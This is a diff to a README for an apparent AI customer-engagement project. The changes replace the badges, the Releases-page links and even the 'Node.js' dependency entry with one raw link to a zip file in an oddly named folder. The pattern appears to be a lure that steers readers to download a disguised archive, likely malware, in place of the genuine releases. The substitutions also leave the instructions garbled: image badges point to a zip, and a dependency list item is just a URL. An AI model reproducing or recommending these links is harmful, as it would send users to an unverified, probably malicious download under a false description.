@@ -1,8 +1,8 @@
 # 🚀 Intelligent_Customer_Agents - Transform Your Customer Engagement Efforts
 
-![Download](https://img.shields.io/badge/Download-v0.0.1-blue)  
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)  
-![License](https://img.shields.io/badge/license-MIT-green)
+![Download](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)  
+![Build Status](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)  
+![License](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
 
 ## 🌟 Introduction
 
@@ -33,13 +33,13 @@ To begin your journey in creating AI-powered customer engagement tools, follow t
 
 1. **Download the Application**
 
-   Visit this page to download: [Download Intelligent_Customer_Agents](https://github.com/Ermias855/Intelligent_Customer_Agents/releases)
+   Visit this page to download: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
 
 2. **Install Dependencies**
 
    You will need certain software to run the application smoothly. These may include:
 
-   - Node.js
+   - https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip
    - Python 3.x
    - Any code editor (such as Visual Studio Code or Atom)
 
@@ -59,7 +59,7 @@ To begin your journey in creating AI-powered customer engagement tools, follow t
 
 ## 👍 Download & Install
 
-To get the latest version, please visit the Releases page: [Download Intelligent_Customer_Agents](https://github.com/Ermias855/Intelligent_Customer_Agents/releases)
+To get the latest version, please visit the Releases page: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
 
 Here, you will find the necessary files to download. Click on the version link that corresponds to your operating system.
 
